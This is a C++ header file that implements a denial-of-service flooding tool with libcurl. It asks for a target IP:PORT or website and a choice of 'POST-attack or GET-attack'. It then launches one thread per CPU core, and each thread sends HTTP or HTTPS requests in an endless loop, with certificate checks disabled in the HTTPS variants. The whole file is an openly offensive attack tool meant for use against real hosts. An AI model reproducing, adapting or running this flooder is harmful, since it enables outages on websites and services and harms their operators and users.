#ifndef DOS_H
#define DOS_H

#include <iostream>
#include <curl/curl.h>
#include <thread>
namespace DoS{

	namespace do_not_touch {


		inline static size_t constexpr write_cb(char* d, size_t n, size_t l, void* p) noexcept
		{
			return n * l;
		}//so solve performance penalty


		namespace POST {
			inline void const dosRegular(const std::string& info) noexcept {
				static uint_fast64_t xTime = 0;
				static uint_fast64_t target = 1000;
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_ALL);
					curl = curl_easy_init();
					curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_setopt(curl, CURLOPT_POST, 1LL);
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "foo=bar&foz=baz");
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					if (xTime == target) {
						target += 1000;
						printf("Requests: %d\n", xTime);
					}
					++xTime;
				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTP 
			 //this function will execute much faster


			inline void const dosSSL(const std::string& info) noexcept {
				static uint_fast64_t xTime = 0;
				static uint_fast64_t target = 1000;
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_ALL);
					curl = curl_easy_init();
					curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
					curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_setopt(curl, CURLOPT_POST, 1LL);
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "foo=bar&foz=baz");
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					if (xTime == target) {
						target += 1000;
						printf("Requests: %d\n", xTime);
					}
				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTPS 
			 //this function will execute fast but not as fast as without SSL

		}


		namespace  GET {

			inline void const dosRegular(const std::string& info) noexcept {
				static uint_fast64_t xTime = 0;
				static uint_fast64_t target = 1000;
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_DEFAULT);
					curl = std::move(curl_easy_init());
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					curl_global_cleanup();
					if (xTime == target) {
						target += 1000;
						printf("Requests: %d\n", xTime);
					}
					++xTime;
				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTP 
			 //this function will execute much faster


			inline void const dosSSL(const std::string& info) noexcept {
				static uint_fast64_t xTime = 0;
				static uint_fast64_t target = 1000;
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_DEFAULT);
					curl = std::move(curl_easy_init());
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					curl_global_cleanup();
					if (xTime == target) {
						target += 1000;
						printf("Requests: %d\n", xTime);
					}
				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTPS 
			 //this function will execute fast but not as fast as without SSL
		}


	}
inline void Execute() {
	const int total = std::thread::hardware_concurrency(); // OWN RISK TO CHANGE IF YOU CHANGE THERE WILL BE TASK SHIFTING PERFORMANCE PENALTY  ;)
	std::vector<std::thread> vec;
	vec.reserve(total);
	std::cout << "------------------< cppLawyer >-------------------\n\nTo quit the program press 'q' and ENTER \n\n";
	std::cout << "Does The Target use HTTPS | y/n : ";
	char https;
	std::string info;
	std::cin >> https;
	if (https == 'y') {
		std::cout << "\n\n Does Input Target IP:PORT or Website: ";
		std::cin >> info;
		std::cout << "POST-attack or GET-attack (type p for POST else enter g):  ";
		char attack;
		std::cin >> attack;

		if (attack == 'p') {
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec.push_back(std::move(std::thread(do_not_touch::POST::dosSSL, std::ref(info))));
			}
			while (std::cin.get() != 'q') { std::this_thread::yield(); };
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec[val].detach();
			}
		}
		else {
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec.push_back(std::move(std::thread(do_not_touch::GET::dosSSL, std::ref(info))));
			}
			while (std::cin.get() != 'q') { std::this_thread::yield(); };
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec[val].detach();
			}
		}

	}
	else {
		std::cout << "\n\n Input Target IP:PORT or Website: ";
		std::cin >> info;
		std::cout << "POST-attack or GET-attack (type p for POST else enter g):  ";
		char attack;
		std::cin >> attack;

		if (attack == 'p') {
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec.push_back(std::move(std::thread(do_not_touch::POST::dosRegular, std::ref(info))));
			}
			while (std::cin.get() != 'q') { std::this_thread::yield(); };
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec[val].detach();
			}
		}
		else {
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec.push_back(std::move(std::thread(do_not_touch::GET::dosRegular, std::ref(info))));
			}
			while (std::cin.get() != 'q') { std::this_thread::yield(); };
			for (uint_fast8_t val = 0; val < total; ++val) {
				vec[val].detach();
			}
		}
	}

	EXIT_SUCCESS;
}

}



#endif // !DOS_H
